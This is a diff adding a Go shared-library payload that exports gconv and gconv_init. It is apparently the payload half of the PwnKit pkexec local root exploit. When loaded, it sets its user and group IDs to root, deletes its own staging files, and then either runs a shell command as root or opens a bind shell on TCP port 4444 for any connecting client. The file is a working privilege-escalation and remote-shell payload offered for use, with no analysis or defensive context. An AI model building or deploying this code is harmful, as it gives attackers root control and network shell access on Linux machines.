@@ -1,0 +1,85 @@
+package main
+
+import "C"
+import (
+	"fmt"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+	"strconv"
+	"strings"
+	"syscall"
+)
+
+//export gconv
+func gconv() {}
+
+func handle_connection(command string, conn net.Conn) {
+	fields := strings.Fields(command)
+	cmd := exec.Command(fields[0], fields[1:]...)
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Start()
+	cmd.Wait()
+	conn.Close()
+}
+
+//export gconv_init
+func gconv_init() {
+	if err := syscall.Setuid(0); err != nil {
+		log.Fatalf("unable to setuid: %v", err)
+	}
+	if err := syscall.Setgid(0); err != nil {
+		log.Fatalf("unable to setgid: %v", err)
+	}
+	if err := syscall.Seteuid(0); err != nil {
+		log.Fatalf("unable to seteuid: %v", err)
+	}
+	if err := syscall.Setegid(0); err != nil {
+		log.Fatalf("unable to setegid: %v", err)
+	}
+	os.Setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")
+	if err := os.RemoveAll("GCONV_PATH=."); err != nil {
+		log.Printf("Unable to remove junk folder: %v", err)
+	}
+	if err := os.RemoveAll("gconv"); err != nil {
+		log.Printf("Unable to remove junk folder: %v", err)
+	}
+	if err := os.RemoveAll("payload.so"); err != nil {
+		log.Printf("Unable to remove payload file: %v", err)
+	}
+	notty, _ := strconv.ParseInt(os.Getenv("NOTTY"), 10, 64)
+	cmd := os.Getenv("CMDTOEXECUTE")
+	if cmd == "" {
+		log.Println("CMDTOEXECUTE is empty fallback to default value")
+		cmd = "sh"
+	}
+	if notty != 1 {
+		log.Printf("Executing command %s", cmd)
+		if err := syscall.Exec("/bin/sh", []string{"/bin/sh", "-c", cmd}, []string{"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"}); err != nil {
+			log.Fatalf("unable to execute command '%s': %v", cmd, err)
+		}
+	} else {
+		notty_port, _ := strconv.ParseInt(os.Getenv("NOTTY_PORT"), 10, 64)
+		if notty_port == 0 {
+			notty_port = 4444
+		}
+		listen, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", 4444))
+		if err != nil {
+			log.Fatalf("unable to listen on ':%d': %v", notty_port, err)
+		}
+		log.Printf("listening on ':%d' executing cmd %s", notty_port, cmd)
+		defer listen.Close()
+		conn, err := listen.Accept()
+		if err != nil {
+			log.Fatalf("unable to accept connection: %v", err)
+		}
+		handle_connection(cmd, conn)
+		os.Exit(0)
+	}
+}
+
+func main() {
+}
